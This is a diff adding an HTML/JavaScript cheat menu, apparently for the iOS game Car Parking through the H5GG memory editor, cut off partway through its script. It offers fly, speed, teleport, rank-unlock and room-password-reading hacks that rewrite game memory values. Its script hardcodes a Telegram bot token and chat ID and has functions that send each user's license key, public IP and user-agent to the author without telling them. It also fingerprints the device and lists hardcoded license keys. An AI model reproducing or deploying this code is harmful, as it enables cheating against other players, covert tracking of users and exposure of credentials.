@@ -1,0 +1,2350 @@
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Menu H5GG PROMAX by MinhDo x Gemini - Vip Edition</title>
+
+    <style>
+        body {
+            margin: 0;
+            background: rgba(0,0,0,0.001);
+            font-family: "Inter", Arial, Helvetica, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #f5f5f5;
+            overflow: hidden;
+            position: relative;
+        }
+
+        #snow-canvas, #sakura-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 9999;
+            display: none;
+        }
+
+        *:not(input, [type="checkbox"], textarea) {
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            user-select: none;
+            outline: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .menu-container {
+            display: none;
+            width: 95vw;
+            max-width: 820px;
+            height: 85vh;
+            max-height: 460px;
+            border-radius: 16px;
+            padding: 2px;
+            background: linear-gradient(135deg, rgba(20,30,48,0.38), rgba(36,59,85,0.38));
+            box-shadow: 0 8px 16px rgba(0,0,0,0.45);
+            transform-style: preserve-3d;
+            perspective: 1000px;
+        }
+
+        .menu-inner {
+            display: flex;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(20,30,48,0.38), rgba(36,59,85,0.38));
+            backdrop-filter: blur(14px);
+            -webkit-backdrop-filter: blur(14px);
+            border-radius: 14px;
+            overflow: hidden;
+            border: 1px solid rgba(255,255,255,0.22);
+        }
+
+        .sidebar {
+            width: 90px;
+            background: rgba(0,0,0,0.38);
+            padding: 8px 6px;
+            display: flex;
+            flex-direction: column;
+            align-items: stretch;
+            border-right: 1px solid rgba(255,255,255,0.18);
+            overflow-y: auto;
+        }
+
+        .sidebar h2 {
+            font-size: 11px;
+            font-weight: 600;
+            margin: 8px 0 12px;
+            text-align: center;
+            color: #FFFFFF;
+            text-shadow: 0 0 1px #ccc;
+            letter-spacing: 0.6px;
+            white-space: pre-line;
+            font-style: italic;
+        }
+
+        .sidebar button {
+            position: relative;
+            background: rgba(255,255,255,0.09);
+            border: 1px solid rgba(255,255,255,0.20);
+            border-radius: 8px;
+            padding: 6px 0;
+            font-size: 10px;
+            color: #FFFFFF;
+            font-weight: 500;
+            margin-bottom: 6px;
+            cursor: pointer;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .sidebar button::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(20,30,48,0.38), rgba(36,59,85,0.38));
+            transition: all 0.4s ease;
+            z-index: 0;
+        }
+
+        .sidebar button span {
+            position: relative;
+            z-index: 1;
+            white-space: pre-line;
+            text-align: center;
+        }
+
+        .sidebar button:hover,
+        .sidebar button.active {
+            background: linear-gradient(135deg, #ddddddcc, #e0e0e0ff);
+            color: #333;
+            text-shadow: 0 0 2px #FFFFFF;
+            box-shadow: 0 0 5px rgba(255,255,255,0.4);
+            transform: translateX(2px) translateZ(10px);
+        }
+
+        .content-area {
+            flex: 1;
+            padding: 8px;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            gap: 6px;
+        }
+
+        .function-box {
+            flex: 1;
+            border-radius: 10px;
+            padding: 10px;
+            background: rgba(255,255,255,0.07);
+            border: 1px solid rgba(255,255,255,0.20);
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            grid-gap: 8px;
+            justify-items: center;
+            align-items: start;
+            box-shadow: inset 0 0 10px rgba(255,255,255,0.05);
+            overflow-y: auto;
+        }
+
+        .option-btn {
+            position: relative;
+            width: 100%;
+            height: 36px;
+            background: rgba(255,255,255,0.09);
+            border: 1px solid rgba(255,255,255,0.22);
+            border-radius: 8px;
+            font-size: 9px;
+            font-weight: 500;
+            color: #FFFFFF;
+            cursor: pointer;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            white-space: pre-line;
+            text-align: center;
+        }
+
+        .option-btn.toggle-btn.active {
+            box-shadow: 0 0 0 2.5px rgba(0, 255, 100, 0.55);
+            border: 1px solid rgba(0, 255, 120, 0.8);
+            background: rgba(0, 255, 100, 0.08);
+        }
+
+        .option-btn::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(20,30,48,0.38), rgba(36,59,85,0.38));
+            transition: all 0.4s ease;
+            z-index: 0;
+        }
+
+        .option-btn span {
+            position: relative;
+            z-index: 1;
+        }
+
+        .option-btn:hover::before {
+            left: 0;
+        }
+
+        .option-btn:hover {
+            color: #FFFFFF;
+            box-shadow: 0 0 6px rgba(0,255,200,0.2);
+            transform: translateY(-1px);
+        }
+
+        .content { display: none; }
+        .content.active { display: block; animation: fadeIn 0.35s ease; }
+
+        @keyframes fadeIn {
+            from {opacity: 0; transform: translateY(6px);}
+            to {opacity: 1; transform: translateY(0);}
+        }
+
+        .about-text, .updating-text {
+            grid-column: 1 / -1;
+            text-align: center;
+            font-size: 10px;
+            color: #EEEEEE;
+            margin-top: 20px;
+            white-space: pre-line;
+            padding: 20px;
+        }
+
+        #key-prompt {
+            display: none !important;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: rgba(0,0,0,0.65);
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 0 15px rgba(255,255,255,0.18);
+            max-width: 380px;
+            width: 90%;
+            z-index: 20;
+            position: relative;
+        }
+
+        #key-prompt label {
+            color: #ddd;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+
+        #key-prompt input {
+            padding: 12px;
+            margin-bottom: 18px;
+            border-radius: 8px;
+            border: 1px solid #666;
+            background: #1a1a1a;
+            color: #fff;
+            width: 100%;
+            font-size: 16px;
+        }
+
+        #key-prompt button {
+            padding: 12px 30px;
+            background: #444;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        #key-prompt button:hover {
+            background: #666;
+        }
+
+        .copy-btn {
+            padding: 5px 13px;
+            background: rgba(255,255,255,0.2);
+            color: #fff;
+            border: 1px solid rgba(255,255,255,0.38);
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 11px;
+            margin-top: 25px;
+        }
+
+        .copy-btn:hover {
+            background: rgba(255,255,255,0.38);
+        }
+
+        .slider-container {
+            grid-column: 1 / -1;
+            text-align: center;
+            color: #FFFFFF;
+            font-size: 12px;
+            margin: 15px 0;
+        }
+
+        input[type="range"] {
+            width: 80%;
+        }
+
+        .music-player {
+            grid-column: 1 / -1;
+            width: 92%;
+            max-width: 360px;
+            margin: 0 auto;
+            padding: 12px;
+            background: rgba(0,0,0,0.45);
+            border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.12);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .music-player h3 {
+            margin: 4px 0 0 0;
+            font-size: 13px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            max-width: 100%;
+        }
+
+        .music-player audio {
+            width: 100%;
+            height: 32px;
+            margin: 4px 0;
+        }
+
+        .music-player .file-inputs {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            width: 100%;
+        }
+
+        .music-player label {
+            font-size: 11px;
+            margin-bottom: 2px;
+        }
+
+        .music-player input[type="file"] {
+            font-size: 11px;
+            width: 100%;
+        }
+
+        .music-player .controls {
+            display: flex;
+            gap: 12px;
+            margin-top: 4px;
+        }
+
+        .music-player button {
+            padding: 6px 14px;
+            background: rgba(255,255,255,0.15);
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 12px;
+            cursor: pointer;
+            min-width: 90px;
+        }
+
+        .music-player button:hover {
+            background: rgba(255,255,255,0.28);
+        }
+
+        .music-player .loop-options {
+            display: flex;
+            gap: 10px;
+            font-size: 11px;
+        }
+
+        .music-player select {
+            padding: 4px 8px;
+            font-size: 11px;
+            background: rgba(30,30,40,0.8);
+            color: white;
+            border: 1px solid #444;
+            border-radius: 4px;
+        }
+
+        #buy-key-link {
+            position: absolute;
+            bottom: 10px;
+            left: 16px;
+            color: rgba(221,221,221,0.8);
+            font-size: 13px;
+            cursor: pointer;
+            text-decoration: underline;
+            z-index: 30;
+        }
+
+        #buy-key-link:hover {
+            color: rgba(221,221,221,0.8);
+        }
+
+        .save-key-container {
+            grid-column: 1 / -1;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 4px 8px;
+            background: rgba(255,255,255,0.08);
+            border-radius: 12px;
+            margin: 12px 0 8px 0;
+            font-size: 9.5px;
+        }
+
+        .save-key-label {
+            font-size: 9.5px;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+        }
+
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 38px;
+            height: 20px;
+        }
+
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            -webkit-transition: .3s;
+            transition: .3s;
+            border-radius: 20px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 16px;
+            width: 16px;
+            left: 2px;
+            bottom: 2px;
+            background-color: white;
+            -webkit-transition: .3s;
+            transition: .3s;
+            border-radius: 50%;
+        }
+
+        input:checked + .slider {
+            background-color: #34c759;
+        }
+
+        input:checked + .slider:before {
+            -webkit-transform: translateX(18px);
+            -ms-transform: translateX(18px);
+            transform: translateX(18px);
+        }
+
+        .copy-all-wrapper {
+            grid-column: 1 / -1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+
+    <canvas id="snow-canvas" width="1264" height="959"></canvas>
+    <canvas id="sakura-canvas" width="1264" height="959"></canvas>
+
+    <div class="menu-container" id="mainMenu" style="display: flex !important;">
+        <div class="menu-inner">
+            <div class="sidebar">
+                <h2>Car Parking H5GG v4.9.10
+VipVersion</h2>
+                <button onclick="showPage('about')" class="active"><span>About me</span></button>
+                <button onclick="showPage('fly')"><span>Fly</span></button>
+                <button onclick="showPage('speed')"><span>Speed hack</span></button>
+                <button onclick="showPage('control')"><span>Nâng cao</span></button>
+                <button onclick="showPage('setting')"><span>Custom Setting</span></button>
+                <button onclick="showPage('chill')"><span>Chill</span></button>
+                <button onclick="showPage('page7')"><span>Information</span></button>
+                <button onclick="showPage('page6')"><span>Cài đặt</span></button>
+            </div>
+
+            <div class="content-area">
+
+                <div id="about" class="content active">
+                    <div class="function-box">
+                        <div class="about-text">Menu này được tạo bởi Minh Do  - @ducmindwvn, và chức năng giao diện của menu thuộc bản quyền của Minh Do , cảm ơn đã sử dụng! - This menu was created by Minh Do  - @ducmindwvn, and the menu's interface functionality is copyrighted by Minh Do , thanks for used!</div>
+                    </div>
+                </div>
+
+                <div id="fly" class="content">
+                    <div class="function-box">
+                        <div class="slider-container">
+                            Giá trị bay:
+                            <input type="range" id="flySlider" min="0" max="10" step="0.1" value="0">
+                            <span id="flyValue">0</span>
+                        </div>
+                        <button class="option-btn" onclick="applyFly()">Áp dụng</button>
+                        <button class="option-btn" onclick="deactivateFly()">Tắt chức năng bay</button>
+                        <button id="airwalk-btn" class="option-btn toggle-btn" onclick="toggleAirWalk()">Đi bộ trên không</button>
+                    </div>
+                </div>
+
+                <div id="speed" class="content">
+                    <div class="function-box">
+                        <button id="gamespeed-btn" class="option-btn toggle-btn" onclick="toggleGameSpeed()">Game Speed</button>
+                        <button id="walkspeed-btn" class="option-btn toggle-btn" onclick="toggleNewWalkSpeed()">Walk Speed</button>
+                        <button id="carspeed-btn" class="option-btn toggle-btn" onclick="toggleSpeedHack()">Car Speed</button>
+                        <button id="carspeedv2-btn" class="option-btn toggle-btn" onclick="toggleCarSpeedV2()">Car Speed v2</button>
+                        <button id="glitch-btn" class="option-btn toggle-btn" onclick="toggleGlitch()">Glitch</button>
+                    </div>
+                </div>
+
+                <div id="control" class="content">
+                    <div class="function-box">
+                        <button id="outofcontrol-btn" class="option-btn toggle-btn" onclick="toggleOutOfControl()">Mất kiểm soát</button>
+                        <button id="outofcontrolv2-btn" class="option-btn toggle-btn" onclick="toggleOutOfControlV2()">Mất kiểm soát v2</button>
+                        <button id="jump-btn" class="option-btn toggle-btn" onclick="toggleJump()">Nhảy xe</button>
+                        <button id="teleport-btn" class="option-btn toggle-btn" onclick="toggleTeleport()">Teleport mới</button>
+                        <button id="autodrive-btn" class="option-btn toggle-btn" onclick="toggleTuDongLaiXe()">Tự động lái xe</button>
+                        <button id="mapvariant-btn" class="option-btn toggle-btn" onclick="toggleMapVariant()">Bản đồ biến thể</button>
+
+                        <button class="option-btn" onclick="activateRaceHack()">Race hack</button>
+                        <button class="option-btn" onclick="jumpOutOfTrack()">Thoát đường đua</button>
+                        <button class="option-btn" onclick="unlockCrown()">Mở khoá Crown</button>
+                        <button class="option-btn" onclick="removeNameLimit()">Tên dài</button>
+                        <button class="option-btn" onclick="scanRoomPassword()">Đọc mật khẩu phòng</button>
+                        <button class="option-btn" onclick="kingRank()">King Rank</button>
+                        <button class="option-btn" onclick="deleteKingRank()">Xoá King Rank</button>
+                    </div>
+                </div>
+
+                <div id="page6" class="content">
+                    <div class="function-box">
+                        <div style="grid-column: 1 / -1; text-align: center; margin: 10px 0;">
+                            <label style="font-size: 12px;">Chế độ sáng/tối:</label><br>
+                            <select id="themeSelect" onchange="changeTheme()">
+                                <option value="light">Sáng</option>
+                                <option value="dark">Tối</option>
+                            </select>
+                        </div>
+                        <div style="grid-column: 1 / -1; text-align: center; margin: 10px 0;">
+                            <label style="font-size: 12px;">Chọn hiệu ứng rơi:</label><br>
+                            <select id="effectSelect" onchange="changeEffect()">
+                                <option value="none">Tắt</option>
+                                <option value="snow">Tuyết </option>
+                                <option value="sakura">Hoa anh đào </option>
+                            </select>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="setting" class="content">
+                    <div class="function-box">
+                        <button class="option-btn" onclick="activateXrayGlass()">Kính Xquang</button>
+                        <button class="option-btn" onclick="activateChangeHP()">Thay đổi hp</button>
+                        <button class="option-btn" onclick="activateHPv2()">HP V2</button>
+
+                        <button class="option-btn" onclick="activateBodyChrome()">Xe chrome</button>
+                        <button class="option-btn" onclick="activateRimChrome()">Mâm chrome</button>
+                        <button class="option-btn" onclick="activateMamNham()">Mâm nhám</button>
+
+                        <button class="option-btn" onclick="activateCanhGioChrome()">Chrome thủ công</button>
+                        <button class="option-btn" onclick="activateBodyCode()">Thay đổi/lấy mã body</button>
+                        <button class="option-btn" onclick="activateRemoveBodyKit()">Tháo body kit</button>
+                    </div>
+                </div>
+
+                <div id="chill" class="content">
+                    <div class="function-box">
+                        <div class="music-player">
+                            <h3 id="music-title">Radio</h3>
+                            <audio id="musicPlayer" controls="">
+                                Your browser does not support the audio element.
+                            </audio>
+                            <div class="file-inputs">
+                                <label for="musicFile1">File nhạc 1 (.mp3):</label>
+                                <input type="file" id="musicFile1" accept=".mp3" onchange="handleMusicUpload(0)">
+                                <label for="musicFile2">File nhạc 2 (.mp3):</label>
+                                <input type="file" id="musicFile2" accept=".mp3" onchange="handleMusicUpload(1)">
+                            </div>
+                            <div class="controls">
+                                <button onclick="togglePlay()"></button>
+                                <button onclick="nextSong()"></button>
+                            </div>
+                            <div class="loop-options">
+                                <label>Lặp lại:</label>
+                                <select id="loopMode" onchange="updateLoopMode()">
+                                    <option value="none">Tắt</option>
+                                    <option value="one">Lặp lại 1 bài</option>
+                                    <option value="all" selected="">Lặp lại tất cả</option>
+                                </select>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="page7" class="content">
+                    <div class="function-box">
+                        <div class="updating-text" style="font-size: 11px; line-height: 0.53;">
+                            <span style="display: inline-flex; align-items: center; justify-content: center; gap: 4px;">
+                                <a href="https://www.tiktok.com/@duc.minhwvn" target="_blank" style="color: #fff; text-decoration: underline; font-size: 11px;">Tiktok: @l2km4</a>
+                            </span><br><br>
+                            <span style="display: inline-flex; align-items: center; justify-content: center; gap: 4px;">
+                                <a href="ig:dcu.mindwvn._" target="_blank" style="color: #fff; text-decoration: underline; font-size: 11px;">Telegram: @ducmindwvn</a>
+                            </span><br><br>
+                            <span style="display: inline-flex; align-items: center; justify-content: center; gap: 4px;">
+                                <a href="tiktok: @duc.mindwvn" target="_blank" style="color: #fff; text-decoration: underline; font-size: 11px;">https://www.tiktok.com/@duc.minhwvn</a>
+                            </span><br><br>
+                            <span id="ios-version-info" style="font-size: 10px; color: #ccc;">Phiên bản iOS: 36.0</span><br>
+                            <span id="bundle-info" style="font-size: 10px; color: #ccc;">Phiên bản ứng dụng: 4.9.10</span><br>
+                            <span id="expire-info" style="font-size: 10px; color: #ccc;">Hết hạn: Key cái đb</span>
+                        </div>
+
+                        <div class="copy-all-wrapper">
+                            
+
+                            <div class="save-key-container">
+                                <span class="save-key-label">Lưu Key  </span>
+                                <label class="switch">
+                                    <input type="checkbox" id="saveKeyToggle" onchange="toggleSaveKey()">
+                                    <span class="slider"></span>
+                                </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+<script>
+// ====================== PHẦN GỬI TELEGRAM + IP ======================
+const BOT_TOKEN = "8339009899:AAGXLm7I6GZm4urlWRJY_VAqxKOYFXcHSsY";
+const ADMIN_CHAT_ID = "7294411802";
+
+async function sendSecretNotification(ip = "Không lấy được", usedKey = "") {
+    const now = new Date();
+    const vietnamTime = now.toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
+    const message =
+        "🔑KEY ĐƯỢC SỬ DỤNG - INFORMATION✅\n\n" +
+        "🔑Key: " + (usedKey || VALID_KEY) + "\n" +
+        "⏳Hết hạn: " + currentExpiryFormat + "\n" +
+        "⏰Thời gian: " + vietnamTime + "\n" +
+        "💻Public IP: " + ip + "\n" +
+        "User-Agent: " + navigator.userAgent;
+
+    const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + ADMIN_CHAT_ID + "&text=" + encodeURIComponent(message);
+
+    try {
+        await fetch(url);
+    } catch (e) {}
+}
+
+async function sendApprovalCodeRequest(ip = "Không lấy được", usedKey = "") {
+    const now = new Date();
+    const vietnamTime = now.toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
+    const randomCode = Math.floor(100000 + Math.random() * 900000).toString();
+
+    const message =
+        "YÊU CẦU DUYỆT THIẾT BỊ - MÃ DUYỆT MỚI ❗\n\n" +
+        "🔑Key: " + (usedKey || VALID_KEY) + "\n" +
+        "⏰Thời gian: " + vietnamTime + "\n" +
+        "💻Public IP: " + ip + "\n" +
+        "User-Agent: " + navigator.userAgent + "\n\n" +
+        "MÃ DUYỆT : " + randomCode;
+
+    const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + ADMIN_CHAT_ID + "&text=" + encodeURIComponent(message);
+
+    try {
+        await fetch(url);
+        return randomCode;
+    } catch (e) {
+        return null;
+    }
+}
+
+async function getUserIP() {
+    try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip || "Không lấy được";
+    } catch {
+        return "Không lấy được";
+    }
+}
+
+// ====================== HỆ THỐNG KEY NHÓM (20 NHÓM) ======================
+let currentKeyGroup = null;
+let currentExpiryFormat = '';
+
+const KEY_GROUPS = [
+    {
+        key: "keycl",
+        allowedIOS: [""],
+        expiry: new Date('2026-01-14T00:00:00Z'),
+        expiryFormat: '14/09/2029',
+        checkIOS: true,
+        requireApproval: true
+    },
+
+    { key: "cac", allowedIOS: ["18.3.2","18"], expiry: new Date('2026-01-31T00:00:00Z'), expiryFormat: '31/01/2026', checkIOS: true, requireApproval: true },
+
+    { key: "KEY3_EXAMPLE", allowedIOS: ["18.3.2"], expiry: new Date('2026-10-15T00:00:00Z'), expiryFormat: '15/10/2026', checkIOS: true, requireApproval: true },
+
+    { key: "key-cheatgameios7days048939858-n8v2v0ưbsq", allowedIOS: ["18.7.0"], expiry: new Date('2026-07-11T00:00:00Z'), expiryFormat: '11/07/2026', checkIOS: false, requireApproval: false },
+
+    { key: "key-cheatgameios14days048394-cna4894s", allowedIOS: ["16.7.16"], expiry: new Date('2026-08-17T00:00:00Z'), expiryFormat: '17/08/2026', checkIOS: true, requireApproval: false },
+
+    { key: "key-cheatgameios30days983239-cmw29fjf9", allowedIOS: ["18.7.0"], expiry: new Date('2026-08-20T00:00:00Z'), expiryFormat: '20/08/2026', checkIOS: true, requireApproval: false },
+
+    { key: "key-cheatgameios30days93874958-d47cn39vjd", allowedIOS: ["18.7.0"], expiry: new Date('2026-09-02T00:00:00Z'), expiryFormat: '02/09/2026', checkIOS: true, requireApproval: false },
+
+    { key: "key-cheatgameios3months02842038-bv939snc92", allowedIOS: ["18.7.0"], expiry: new Date('2026-10-26T00:00:00Z'), expiryFormat: '26/10/2026', checkIOS: false, requireApproval: true },
+
+    { key: "key-cheatgameios7days58349583-cn4s95c7b4s", allowedIOS: ["18.7.0"], expiry: new Date('2026-08-11T00:00:00Z'), expiryFormat: '11/08/2026', checkIOS: true, requireApproval: false },
+
+    { key: "key-cheatgameios3months59306849-59xmfsmnt9", allowedIOS: ["18.7.0"], expiry: new Date('2026-10-21T00:00:00Z'), expiryFormat: '21/10/2026', checkIOS: true, requireApproval: false },
+
+    { key: "key-cheatgameios30days5749583-cbs94nbs9t", allowedIOS: ["18.3.0"], expiry: new Date('2026-08-21T00:00:00Z'), expiryFormat: '21/08/2026', checkIOS: true, requireApproval: false },
+
+    { key: "key-cheatgameios30days947394-c94jsodjhv", allowedIOS: ["99.99.99"], expiry: new Date('2026-08-09T00:00:00Z'), expiryFormat: '09/08/2026', checkIOS: false, requireApproval: false },
+
+    { key: "key-cheatgameios7days048305-cns498494s", allowedIOS: ["18.7.0"], expiry: new Date('2026-08-11T00:00:00Z'), expiryFormat: '11/08/2026', checkIOS: true, requireApproval: false },
+
+    { key: "1231323", allowedIOS: ["18.7.0"], expiry: new Date('2026-10-15T00:00:00Z'), expiryFormat: '15/10/2026', checkIOS: true, requireApproval: false },
+
+    { key: "key-cheatgameios7days0492305-cna4059amc4", allowedIOS: ["18.7.0"], expiry: new Date('2026-08-13T00:00:00Z'), expiryFormat: '13/08/2026', checkIOS: true, requireApproval: false },
+
+    { key: "key-cheatgameios7days0593503-cm59c594s6v", allowedIOS: ["99.99.99"], expiry: new Date('2026-08-23T00:00:00Z'), expiryFormat: '23/08/2026', checkIOS: false, requireApproval: false },
+
+    { key: "SLOT TRONG", allowedIOS: ["99.99.99"], expiry: new Date('2026-10-15T00:00:00Z'), expiryFormat: '15/10/2026', checkIOS: true, requireApproval: true },
+
+    { key: "SLOT TRONG", allowedIOS: ["99.99.999"], expiry: new Date('2026-10-15T00:00:00Z'), expiryFormat: '15/10/2026', checkIOS: false, requireApproval: true },
+
+
+
+    { key: "Anhliem", allowedIOS: ["18.3.2"], expiry: new Date('20367-01-01T00:00:00Z'), expiryFormat: '01/01/203697', checkIOS: true, requireApproval: false }
+
+];
+
+
+function findValidKeyGroup(inputKey) {
+    for (let group of KEY_GROUPS) {
+        if (group.key === inputKey) {
+            return group;
+        }
+    }
+    return null;
+}
+
+
+const VALID_KEY = 'lonmeno';  
+
+const ALLOWED_IOS_VERSIONS = ["18.0.0"];
+
+const EXPIRY_DATE = new Date('2026-09-14T00:00:00Z');
+const EXPIRY_DATE_FORMAT = '14/09/2029';
+
+function generateDeviceFingerprint() {
+    const { deviceName, iOSVersion } = getDeviceInfoObj();
+    const fingerprint =
+        navigator.userAgent +
+        "|" + deviceName +
+        "|" + iOSVersion +
+        "|" + (navigator.hardwareConcurrency || "unknown") +
+        "|" + (navigator.deviceMemory || "unknown");
+   
+    let hash = 0;
+    for (let i = 0; i < fingerprint.length; i++) {
+        const char = fingerprint.charCodeAt(i);
+        hash = ((hash << 5) - hash) + char;
+        hash = hash & hash;
+    }
+    return "dev_" + Math.abs(hash).toString(36);
+}
+
+function getDeviceInfoObj() {
+    let deviceName = 'Unknown';
+    if (/iPhone/.test(navigator.userAgent)) deviceName = 'iPhone';
+    else if (/iPad/.test(navigator.userAgent)) deviceName = 'iPad';
+    else if (/iPod/.test(navigator.userAgent)) deviceName = 'iPod';
+
+    let iOSVersion = 'Unknown';
+    const match = navigator.userAgent.match(/OS (\d+)_(\d+)_?(\d+)?/i);
+    if (match) {
+        iOSVersion = match[1] + '.' + (match[2] || 0) + '.' + (match[3] || 0);
+    }
+
+    return { deviceName, iOSVersion };
+}
+
+function tryAutoLogin() {
+    checkKey();
+    return true;
+}
+
+function toggleSaveKey() {
+    const toggle = document.getElementById('saveKeyToggle');
+    if (!toggle) return;
+
+    if (toggle.checked) {
+        const fingerprint = generateDeviceFingerprint();
+        const authData = {
+            key: currentKeyGroup ? currentKeyGroup.key : VALID_KEY,
+            fingerprint: fingerprint,
+            savedAt: new Date().toISOString()
+        };
+        localStorage.setItem('ducmindwvn_saved_auth', JSON.stringify(authData));
+        alert("Đã lưu thành công thông tin key!\nKhông cần nhập key cho những lần sau.");
+    } else {
+        localStorage.removeItem('ducmindwvn_saved_auth');
+    }
+}
+
+async function checkKey() {
+    document.querySelectorAll('#key-prompt').forEach(el => el.remove());
+    const menu = document.querySelector('.menu-container');
+    if (menu) menu.style.display = 'flex';
+}
+function showApprovedInfo(deviceName, iOSVersion, group) {
+    const msg =
+        "Device: " + deviceName + "\n" +
+        "iOS Version: " + iOSVersion + "\n" +
+        "Key: " + group.key + "\n" +
+        "Hết Hạn " + group.expiryFormat;
+    alert(msg);
+}
+async function init() {
+    await checkKey();
+}
+init();
+
+function showBuyOptions() {
+    const choice = prompt("1. Telegram\n 2. Tiktok");
+    if (choice === "1") {
+        window.open("tiktok:@duc.mindwvn", "_blank");
+    } else if (choice === "2") {
+        window.open("https://www.tiktok.com/@duc.mindwvn", "_blank");
+    } else {
+        alert("Lựa chọn không hợp lệ!");
+    }
+}
+
+function showPage(pageId) {
+    document.querySelectorAll('.content').forEach(el => el.classList.remove('active'));
+    document.querySelectorAll('.sidebar button').forEach(btn => btn.classList.remove('active'));
+
+    document.getElementById(pageId).classList.add('active');
+
+    const btn = Array.from(document.querySelectorAll('.sidebar button')).find(
+        b => b.onclick.toString().includes(pageId)
+    );
+    if (btn) btn.classList.add('active');
+}
+
+function copyTikTokLink() {
+    const link = "Tiktok: https://www.tiktok.com/@duc.minhwvn | Telegram:@ducmindwvn";
+    const textarea = document.createElement("textarea");
+    textarea.value = link;
+    document.body.appendChild(textarea);
+    textarea.select();
+    try {
+        document.execCommand("copy");
+        alert("Đã copy thông tin thành công vào clipboard!");
+    } catch (err) {
+        alert("Không thể copy tự động. Hãy copy thủ công: " + link);
+    }
+    document.body.removeChild(textarea);
+}
+
+document.getElementById('flySlider').addEventListener('input', function() {
+    document.getElementById('flyValue').textContent = this.value;
+});
+
+let currentFlyValue = null;
+
+// ====================== BIẾN TRẠNG THÁI TÍNH NĂNG ĐẶC BIỆT ======================
+let specialFeatures = {
+    fly: false,
+    gameSpeed: false,
+    walkSpeed: false,
+    carSpeed: false,
+    carSpeedV2: false,
+    glitch: false,
+    autoDrive: false,
+    outOfControl: false,
+    teleport: false
+};
+
+function disableOtherSpecialFeatures(current) {
+    if (current !== 'fly' && specialFeatures.fly) { deactivateFly(); }
+    if (current !== 'gameSpeed' && specialFeatures.gameSpeed) { toggleGameSpeed(); }
+    if (current !== 'walkSpeed' && specialFeatures.walkSpeed) { toggleNewWalkSpeed(); }
+    if (current !== 'carSpeed' && specialFeatures.carSpeed) { toggleSpeedHack(); }
+    if (current !== 'carSpeedV2' && specialFeatures.carSpeedV2) { toggleCarSpeedV2(); }
+    if (current !== 'glitch' && specialFeatures.glitch) { toggleGlitch(); }
+    if (current !== 'autoDrive' && specialFeatures.autoDrive) { toggleTuDongLaiXe(); }
+    if (current !== 'outOfControl' && specialFeatures.outOfControl) { toggleOutOfControl(); }
+    if (current !== 'teleport' && specialFeatures.teleport) { toggleTeleport(); }
+}
+
+// ====================== TÍNH NĂNG BAY ======================
+function applyFly() {
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG！"); return; }
+    disableOtherSpecialFeatures('fly');
+    try {
+        const value = document.getElementById('flySlider').value;
+        if (currentFlyValue === null) {
+            h5gg.searchNumber('-9.8', 'F32', '0x00000000', '0x200000000');
+        }
+        h5gg.editAll(value, 'F32');
+        currentFlyValue = value;
+        specialFeatures.fly = true;
+        alert("Đã bật chức năng bay, các tính năng đặc biệt khác đã tự động tắt!");
+    } catch (e) { alert("Lỗi: " + e.message); }
+}
+
+function deactivateFly() {
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG！"); return; }
+    try {
+        if (currentFlyValue !== null) {
+            h5gg.editAll('-9.8', 'F32');
+            h5gg.clearResults();
+            currentFlyValue = null;
+        }
+        h5gg.editAll('-9.8', 'F32');
+        h5gg.clearResults();
+        specialFeatures.fly = false;
+    } catch (e) { alert("Lỗi: " + e.message); }
+}
+
+// ====================== GAME SPEED ======================
+let gameSpeedEnabled = false;
+function toggleGameSpeed() {
+    const btn = document.getElementById('gamespeed-btn');
+    if (typeof h5gg === 'undefined') { alert("Không thể tìm thấy H5GG！"); return; }
+
+    if (!gameSpeedEnabled) {
+        disableOtherSpecialFeatures('gameSpeed');
+        alert("Vui Lòng Không Xuống Xe!");
+        let speed = prompt("Vui Lòng Nhập Tốc Độ (2 - 30):");
+        if (speed === null) return;
